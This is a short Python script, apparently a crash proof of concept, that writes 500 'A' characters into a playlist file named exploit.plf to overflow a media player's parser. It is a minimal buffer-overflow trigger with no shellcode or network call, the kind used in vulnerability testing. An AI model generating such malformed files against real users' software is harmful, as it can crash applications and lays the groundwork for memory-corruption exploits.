#!/usr/bin/python

file = open("exploit.plf", "wb")

payload = ("A"*500) 

file.write(payload)
file.close()
